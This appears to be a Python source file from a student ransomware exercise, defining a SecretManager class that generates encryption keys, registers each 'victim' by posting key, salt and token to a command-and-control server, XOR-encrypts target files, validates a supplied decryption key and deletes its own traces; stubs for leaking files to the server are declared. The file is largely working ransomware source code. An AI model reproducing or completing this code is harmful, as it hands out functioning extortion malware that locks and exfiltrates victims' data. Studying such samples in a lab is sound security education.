"""
    Anouar EL GAZRI 5A IoT
"""

from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import shutil

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        """
            Default constructor to initialize
        """
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        """
            Method used to do the derivation using PBKDF2HMAC with SHA256
        """
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=self.KEY_LENGTH,salt=salt,iterations=self.ITERATION,) # using this resource "https://cryptography.io/en/latest/hazmat/primitives/key-derivation-functions/"
        key_derivated = kdf.derive(key)

        return key_derivated # we return the derivated key
    
    def create(self) -> Tuple[bytes, bytes, bytes]:
        """
            Method used to create and generate crypto data
        """
        salt = secrets.token_bytes(self.SALT_LENGTH)  
        key = secrets.token_bytes(self.KEY_LENGTH)  
        key_derivated = self.do_derivation(salt, key)
        token = secrets.token_bytes(self.TOKEN_LENGTH)
    
        self._salt = salt
        self._key = key_derivated
    
        # saving the key in a file
        key_path = os.path.join(self._path, "key.bin")
        with open(key_path, "wb") as key_file:
            key_file.write(self._key)
    
        self._token = token
    
        return salt, key_derivated, token

    
    def bin_to_b64(self, data:bytes)->str:
        """
            Method used to encode data in base64
        """
        temp_data = base64.b64encode(data)
        return str(temp_data, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        """
            Method used to register the victim to the CNC
        """
        # encoding elements in base64
        data_injsonformat = {"token": self.bin_to_b64(token),"salt": self.bin_to_b64(salt),"key": self.bin_to_b64(key)}
        url = f"http://{self._remote_host_port}/new" # endpoint url
        response = requests.post(url, json=data_injsonformat)

        if response.status_code == 200: # 200 HTTP code validation OK
            self._log.info("DATA SENT TO CNC")
        else:
            self._log.error(f"FAILED SENDING DATA {response.status_code}")

    def setup(self)->None:
        """
            Method used to create crypto data and register malware to cnc
        """
        # creating crypto data
        salt, key, token = self.create()
        if self._key is None: # verifying if the key is created
            self._log.error("KEY initilization error during SETUP")
        else:
            self._log.info("KEY intilization successful: ", self._key)
        
        # verify if self._path already exist
        if not os.path.exists(self._path):
            os.makedirs(self._path)
            self._log.info(f"PATH {self._path} created!")
        
        # saving the token and the salf in local
        token_path = os.path.join(self._path, "token.bin")
        salt_path = os.path.join(self._path, "salt.bin")

        with open(token_path, "wb") as token_file:
            token_file.write(token)
            self._log.info(f"SUCCESS TOKEN saved in {token_path}.")

        with open(salt_path, "wb") as salt_file:
            salt_file.write(salt)
            self._log.info(f"SUCCESS SALT saved in {salt_path}.")

        # sending data to the CNC
        self.post_new(salt, key, token)


    def load(self) -> None:
        """
            Method used to load crypto data from the target
        """
        # loading crypto data (token, salt, key)
        token_path = os.path.join(self._path, "token.bin")
        salt_path = os.path.join(self._path, "salt.bin")
        key_path = os.path.join(self._path, "key.bin")

        # token loading
        if os.path.exists(token_path):
            with open(token_path, "rb") as token_file:
                self._token = token_file.read()
                self._log.info(f"SUCCESS TOKEN loaded from {token_path}.")
        else:
            self._log.error(f"TOKEN file not found: {token_path}")
            self._token = None

        # salt loading
        if os.path.exists(salt_path):
            with open(salt_path, "rb") as salt_file:
                self._salt = salt_file.read()
                self._log.info(f"SUCCESS SALT loaded from {salt_path}")
        else:
            self._log.error(f"SALT file not found: {salt_path}")
            self._salt = None

        # key loading
        if os.path.exists(key_path):
            with open(key_path, "rb") as key_file:
                self._key = key_file.read()
                self._log.info(f"SUCCESS KEY loaded from {key_path} : KEY", self._key)
                key_64 = base64.b64encode(self._key) # encoding the key in base64
                self._log.info(f"KEY in b64:  {key_64}")
        else:
            self._log.error(f"KEY file not found: {key_path}")
            self._key = None

    def check_key(self, temp_key:bytes)->bool:
        """
            Method used to check if the key is valid
        """
        # assert the key is valid
        derived_key = self.do_derivation(self._salt, temp_key) # we derive the key first
        self._log.info(f"DERIVATED KEY: {derived_key}")
        valid_key = derived_key == self._key
        return valid_key

    def set_key(self, key_in_b64: str) -> None:
        """
            Method used to set the key if the key is valid for decryption
        """
        try:
            temp_key = base64.b64decode(key_in_b64)
            self._log.info(f"DECODED KEY from base64: {temp_key}")

        except base64.binascii.Error as e:
            raise ValueError(f"B64 DECODING ERROR : {e}")
        
        # verify if the key is valid
        if self.check_key(temp_key):
            self._key = temp_key
            self._log.info("SUCESS KEY CHECKED")
        else:
            raise Exception("KEY not valid. Please try again.")

    def get_hex_token(self)->str:
        """
            Method used to return the token in hexa format
        """
        if self._token is not None:
            # token hash with SHA256
            hashed_token = sha256(self._token).hexdigest() # hexdigest allows us to convert the hash to a string
            return hashed_token
        else:
            self._log.error("TOKEN UNDEFINED")
            return ""

    def xorfiles(self, files:List[str])->None:
        """
            Method used to encrypt a list of files with the key
        """
        # error management
        if self._key is None or not files:
            self._log.error("UNDEFINED KEY or NO FILES")
            return
        
        # encrypt files
        for filePATH in files:
            if not os.path.exists(filePATH):
                self._log.warning(f"FILE NOT FOUND: {filePATH}")
                continue
            try:
                xorfile(filePATH, self._key)
                self._log.info(f"FILE {filePATH} SUCCESS")
            except Exception as e:
                self._log.error(f"ERROR {filePATH}: {e}")


    def post_file(self, path: str, params: dict, body: dict) -> dict:
        # used to transfer the retrieved files to the server
        raise NotImplemented()

    def leak_files(self, files: List[str]) -> None:
        # used to send the files to the CNC before the encryption
        raise NotImplemented()

    def clean(self):
        """
            Method used to clean the target (removing all crypto data)
        """
        # remove crypto data from the target
        paths = [(os.path.join(self._path, "salt.bin"), "salt_file"), (os.path.join(self._path, "token.bin"), "token_file"),]
        
        # we delete the token file and the salt file if they exists

        for actualpath, path_name in paths:
            if os.path.exists(actualpath):
                os.remove(actualpath)
                self._log.info(f"File removed: {actualpath}")
            else:
                self._log.warning(f"{path_name.capitalize()} not found: {actualpath}")

        # deleting the directory
        if os.path.exists(self._path):
            shutil.rmtree(self._path)
            self._log.info(f"Directory removed: {self._path}")
        else:
            self._log.warning(f"Directory not found: {self._path}")
